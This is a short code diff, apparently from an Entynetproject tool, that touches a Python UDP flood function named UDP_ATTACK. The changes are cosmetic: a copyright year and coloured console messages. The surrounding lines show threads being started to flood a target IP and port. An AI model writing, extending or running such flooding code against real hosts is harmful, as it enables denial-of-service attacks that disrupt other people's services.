@@ -2,7 +2,7 @@
 
 # MIT License
 #
-# Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
+# Copyright (C) 2020, Entynetproject. All Rights Reserved.
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -34,7 +34,7 @@ def UDP_ATTACK(threads, attack_time, target):
 	target_ip = target.split(":")[0]
 	target_port = int(target.split(":")[1])
 
-	print("[#] Attack started for " + str(attack_time) + " secounds..")
+	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting UDP attack...")
 	
 
 	threads_list = []
@@ -55,11 +55,11 @@ def UDP_ATTACK(threads, attack_time, target):
 			except Exception as e:
 				print(e)
 			else:
-				print("[+] UDP random packet sent! Payload size: " + str(len(payload)))
+				print("\033[1;32m"+"[+]"+"\033[0m"+" UDP packet was sent! Packet size: " + str(len(payload)) + ".")
 
 	# Start threads
 	for thread in range(threads):
-		print("[#] Staring thread " + str(thread))
+		print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread)+ "...")
 		t = Thread(target = udp_flood)
 		t.start()
 		threads_list.append(t)
@@ -70,4 +70,4 @@ def UDP_ATTACK(threads, attack_time, target):
 		FINISH = True
 		thread.join()
 	
-	print("[!] UDP attack stopped!")
+	print("\033[1;33m"+"[!]"+"\033[0m"+" UDP attack completed.")
